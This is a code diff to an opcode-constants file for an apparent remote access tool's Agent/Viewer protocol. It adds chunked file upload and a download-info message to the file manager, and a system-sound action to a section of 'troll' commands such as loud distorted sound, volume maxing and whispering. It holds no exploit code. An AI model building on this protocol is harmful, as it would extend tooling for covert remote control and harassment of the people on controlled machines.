@@ -78,15 +78,16 @@ OP_PM_DATA = 0x75  # Agent -> Viewer: JSON [{pid, name, cpu, mem}]
 OP_PM_KILL = 0x76  # Viewer -> Agent: {pid: int}
 
 # ============================================================================
-# File Manager (0x78-0x7E)
+# File Manager (0x78-0x7F)
 # ============================================================================
 OP_FM_LIST = 0x78  # Viewer -> Agent: {"path": "..."}
 OP_FM_DATA = 0x79  # Agent -> Viewer: JSON [{name, is_dir, size, modified}]
 OP_FM_DOWNLOAD = 0x7A  # Viewer -> Agent: {"path": "..."}
-OP_FM_CHUNK = 0x7B  # Agent -> Viewer: file chunk
-OP_FM_UPLOAD = 0x7C  # Viewer -> Agent: {"path": "...", "data": base64}
+OP_FM_CHUNK = 0x7B  # Bidirectional: file chunk (download & chunked upload)
+OP_FM_UPLOAD = 0x7C  # Viewer -> Agent: {"path": "...", "data": base64} or {"path": "...", "size": N} for chunked
 OP_FM_DELETE = 0x7D  # Viewer -> Agent: {"path": "..."}
 OP_FM_MKDIR = 0x7E  # Viewer -> Agent: {"path": "..."}
+OP_FM_DOWNLOAD_INFO = 0x7F  # Agent -> Viewer: {"size": N, "name": "filename"}
 
 # ============================================================================
 # Clipboard (0x80-0x87)
@@ -130,6 +131,7 @@ OP_TROLL_ALERT_LOOP = 0xA1  # {"enabled": bool}
 OP_TROLL_VOLUME_MAX = 0xA2  # max volume + play sound
 OP_TROLL_EARRAPE = 0xA3  # distorted loud sound
 OP_TROLL_WHISPER = 0xA4  # {"enabled": bool}
+OP_TROLL_SYSTEM_SOUND = 0xA5  # {"sound": "..."}
 
 # ============================================================================
 # System
